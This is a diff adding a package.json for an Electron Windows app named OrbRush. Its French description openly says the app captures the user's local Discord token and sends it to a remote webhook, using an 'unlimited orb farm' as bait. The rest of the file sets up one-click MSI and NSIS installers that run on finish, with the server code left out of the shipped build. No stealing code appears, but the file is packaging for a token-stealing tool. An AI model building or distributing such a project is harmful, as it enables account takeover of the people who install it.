@@ -1,0 +1,77 @@
+{
+  "name": "orbrush",
+  "productName": "OrbRush",
+  "version": "1.1.0",
+  "description": "Capture le token Discord local et l'envoie sur un webhook distant, avec un design futuriste et un farm d'orbs illimite.",
+  "main": "electron/main.js",
+  "author": {
+    "name": "OrbRush",
+    "email": "orbrush@local.dev"
+  },
+  "license": "MIT",
+  "private": true,
+  "engines": {
+    "node": ">=18"
+  },
+  "scripts": {
+    "start": "electron .",
+    "dev": "electron .",
+    "server": "node server/index.js",
+    "render": "node server/index.js",
+    "dir": "electron-builder --dir",
+    "dist": "electron-builder --win msi --x64",
+    "dist:exe": "electron-builder --win nsis --x64",
+    "dist:all": "electron-builder --win msi nsis --x64"
+  },
+  "dependencies": {
+    "express": "^4.19.2"
+  },
+  "devDependencies": {
+    "electron": "^31.7.7",
+    "electron-builder": "^24.13.3"
+  },
+  "build": {
+    "appId": "com.orbrush.desktop",
+    "productName": "OrbRush",
+    "copyright": "Copyright (c) 2026 OrbRush",
+    "artifactName": "OrbRush-${version}-setup.${ext}",
+    "directories": {
+      "output": "release",
+      "buildResources": "build"
+    },
+    "files": [
+      "electron/**/*",
+      "src/**/*",
+      "package.json",
+      "!server/**/*"
+    ],
+    "asar": true,
+    "compression": "maximum",
+    "win": {
+      "target": [
+        {
+          "target": "msi",
+          "arch": [
+            "x64"
+          ]
+        }
+      ]
+    },
+    "msi": {
+      "oneClick": true,
+      "perMachine": false,
+      "runAfterFinish": true,
+      "createDesktopShortcut": true,
+      "createStartMenuShortcut": true,
+      "shortcutName": "OrbRush"
+    },
+    "nsis": {
+      "oneClick": true,
+      "perMachine": false,
+      "allowToChangeInstallationDirectory": false,
+      "createDesktopShortcut": true,
+      "createStartMenuShortcut": true,
+      "shortcutName": "OrbRush"
+    }
+  }
+}
